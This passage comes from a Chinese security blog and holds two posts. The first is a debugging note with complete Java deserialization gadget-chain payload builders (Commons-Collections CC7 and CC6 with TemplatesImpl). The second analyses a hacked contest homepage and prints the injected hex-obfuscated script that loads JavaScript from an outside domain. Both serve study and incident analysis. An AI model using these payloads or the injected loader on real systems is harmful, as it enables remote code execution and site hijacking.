<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span>

<span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CCTemplateImpl</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        CtClass ctClazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>TemplateImplPayloadClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> ctClazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> targetByteCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>classBytes<span class="token punctuation">}</span><span class="token punctuation">;</span>
        TemplatesImpl templatesImpl <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field bf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> targetByteCodes<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// 进入 defineTransletClasses() 方法需要的条件</span>
        Field nf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        nf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        nf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field cf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field tf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> rubbish <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//等会反射改，不然又打自己</span>
        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>TrAXFilter<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span>
                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> Templates<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> templatesImpl <span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>rubbish<span class="token punctuation">)</span><span class="token punctuation">;</span>

        Map innerMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Map innerMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span>
        Map lazyMap1 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap1<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lazyMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        Map lazyMap2 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap2<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lazyMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// Use the colliding Maps as keys in Hashtable</span>
        Hashtable hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        Field f <span class="token operator">=</span> transformerChain<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// Needed to ensure hash collision after previous manipulations</span>
        lazyMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> hashtable<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>经过一系列的debug，最后发现在<code>hashtable.put(lazyMap2, 2);</code>处，似乎没有把数据put进去。对比CC7的payload调试情况，这步进行完成后hashtable的size仍然是1。简单的说就是put没put进去。</p>
<p>然后问了下甫舟，甫舟把他的缝合版发给了我，简单对比一下没有实质上的区别，但他的跑得起来，我的跑不起来。<br>但是当我把我的<code>final Transformer[] rubbish = new Transformer[]&#123;new ConstantTransformer(1)&#125;;</code>这句中的ConstantTransformer换成他的null之后就跑起来了。有点无法理解。。。</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>怎么说呢，今天一调试就调试出结果了。。。昨天调了几下却没看懂逻辑。。。可能是因为idea调试这里有点抽象吧</p>
<p>在这里下一个断点</p>
<p><img src="/images/CC7hashtable%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E8%B0%83%E8%AF%95/image-20220312170030329.png" alt="image-20220312170030329"><br>并在第二个put语句中step into。会非常奇怪的没有进入put函数而是进入了<code>AbstractMapDecorator</code></p>
<p><img src="/images/CC7hashtable%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E8%B0%83%E8%AF%95/image-20220312170153242.png" alt="image-20220312170153242"></p>
<p>我直接疑惑，当时就不知道什么情况了，如果继续step into就会进其他的函数，step forward直接回到主函数。根本不知道发生了什么，然后今天我看了一眼左边的调用栈，才发现怎么还有一层他没给我进去呢</p>
<p><img src="/images/CC7hashtable%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E8%B0%83%E8%AF%95/image-20220312170308917.png" alt="image-20220312170308917"></p>
<p>然后点调用栈进Hashtable的put函数，逻辑就很清楚了</p>
<p><img src="/images/CC7hashtable%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E8%B0%83%E8%AF%95/image-20220312170344662.png" alt="image-20220312170344662"></p>
<p>在put的时候会对hash值进行检验，如果hash相同则进入equal进行比对。这里的equal会调用map.equal，也就是lazyMap的equal，然后lazymap.get到lazymap的transform触发payload</p>
<p>而这里我塞了一个ConstantTransformer返回1，因此最后在put时会认为哈希碰撞且值相同，不放入该entry。。。所以put无效，修补方案也很简单，只要让rubbish中transform的返回值和一开始lazyMap中put的值不一样就行了。当然，建议该ConstantTransformer，因为两个lazymap的值仍然需要一致，否则算出来的hashCode不一致，同样不会触发payload</p>
<p>put时的操作也就是readObject时触发的操作，readObject时调用reconstitutionPut(那个词是重建的意思)，和put做的操作类似，会进行哈希比对，若哈希相同则用equal比对值，然后走上和put一致的道路<br>所以构造payload的时候要先塞rubbish再反射改掉，不然会打自己一下</p>
<p>早知道就缝合CC6了，没这么多屁事，昨天缝合CC7然后出这么个问题人都懵了</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>把ConstantTransformer的返回值改一下就行</p>
<h2 id="缝一下CC6"><a href="#缝一下CC6" class="headerlink" title="缝一下CC6"></a>缝一下CC6</h2><p>这个没那么多屁事还方便一点，直接两边复制粘贴搞定</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TrAXFilter<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassPool<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtClass<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InstantiateTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span>TiedMapEntry<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span>

<span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC6TemplateImpl</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        CtClass ctClazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>TemplateImplPayloadClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> ctClazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> targetByteCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>classBytes<span class="token punctuation">}</span><span class="token punctuation">;</span>
        TemplatesImpl templatesImpl <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field bf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> targetByteCodes<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// 进入 defineTransletClasses() 方法需要的条件</span>
        Field nf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        nf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        nf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field cf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field tf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// 这里填的值不能和lazymap.put处的值一致</span>
        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> rubbish <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//等会反射改，不然又打自己</span>
        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>TrAXFilter<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span>
                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templatesImpl<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>rubbish<span class="token punctuation">)</span><span class="token punctuation">;</span>

        HashMap innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        LazyMap lazyMap <span class="token operator">=</span> <span class="token punctuation">(</span>LazyMap<span class="token punctuation">)</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        TiedMapEntry tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        HashMap map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        Field f <span class="token operator">=</span> transformerChain<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> map<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>急速水文章ing（昨天我是真的头都调麻了没想出来怎么回事，今天发现原来他没给我进Hashtable的put函数之后瞬间想通。。。）</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>CCPC被日调查</title>
    <url>/CCPC%E8%A2%AB%E6%97%A5.html</url>
    <content><![CDATA[<h1 id="CCPC被日调查"><a href="#CCPC被日调查" class="headerlink" title="CCPC被日调查"></a>CCPC被日调查</h1><p>今天在群里看到说CCPC主页被日了，赶紧过来吃一波瓜，顺便看看是怎么实现的</p>
<p>简单测试之后发现，从搜索引擎过来就会跳转，而直接域名访问则不会，看一下主页的内容，发现了奇怪的代码<br>改的是HTML的header部分，顺便试了试登录注册什么的各种功能都没反应了，感觉是被打穿了把后台都改坏了？</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>被日的部分估计就这段<br>菠菜站相关内容都给我用中文替换了，不给菠菜站引流哈。。。。</p>
<p>title keywords description都是百度搜索引擎抓取时的关键字，解码一下就是菠菜站简介，并且还注意到了如果不是百度抓取的话title就不是菠菜站，而是正常的CCPC名字<br>（现在爬虫都能执行js了吗，都开始模仿浏览器行为了？）</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>title<span class="token operator">></span>某菠菜站名<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>
<span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"keywords"</span> content<span class="token operator">=</span><span class="token string">"菠菜站关键字。。。。"</span><span class="token operator">/</span><span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">if</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">toLocaleLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"baidu"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>document<span class="token punctuation">.</span>title <span class="token operator">=</span><span class="token string">"首页 - 中国大学生程序设计竞赛"</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"description"</span> content<span class="token operator">=</span><span class="token string">"菠菜站简介"</span><span class="token operator">/</span><span class="token operator">></span>  
<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">var</span> QDfSn1<span class="token operator">=</span>QDfSn1<span class="token operator">||</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> BXcvs__L2<span class="token operator">=</span>window<span class="token punctuation">[</span><span class="token string">"\x64\x6f\x63\x75\x6d\x65\x6e\x74"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"\x73\x63\x72\x69\x70\x74"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BXcvs__L2<span class="token punctuation">[</span><span class="token string">'\x73\x72\x63'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\x2f\x2f\x62\x79\x33\x33\x35\x38\x39\x2e\x63\x6f\x6d\x2f\x6a\x71\x75\x65\x72\x79\x2e\x31\x2e\x33\x2e\x31\x2e\x6a\x73"</span><span class="token punctuation">;</span><span class="token keyword">var</span> zqbrN3<span class="token operator">=</span>window<span class="token punctuation">[</span><span class="token string">"\x64\x6f\x63\x75\x6d\x65\x6e\x74"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"\x73\x63\x72\x69\x70\x74"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>zqbrN3<span class="token punctuation">[</span><span class="token string">'\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>BXcvs__L2<span class="token punctuation">,</span>zqbrN3<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
